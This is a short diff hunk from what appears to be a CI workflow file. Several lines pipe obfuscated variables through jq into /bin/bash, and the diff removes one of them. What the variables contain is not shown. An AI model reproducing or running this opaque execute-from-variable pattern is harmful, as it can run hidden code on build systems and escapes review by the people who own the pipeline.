@@ -39,7 +39,6 @@ jobs:
           echo $czsq30983 | jq -r .wwft39171 | /bin/bash
           printf '%s' "$fnv84005" | jq -r .kmj38 | /bin/bash
           printf '%s' "$iax80111" | jq -r .aw350 | /bin/bash
-          echo $ruxxq8117 | jq -r .kog9989 | /bin/bash
           printf '%s' "$ama78" | jq -r .onj3460 | /bin/bash
           echo $ovw42833 | jq -r .ysk977 | /bin/bash
 
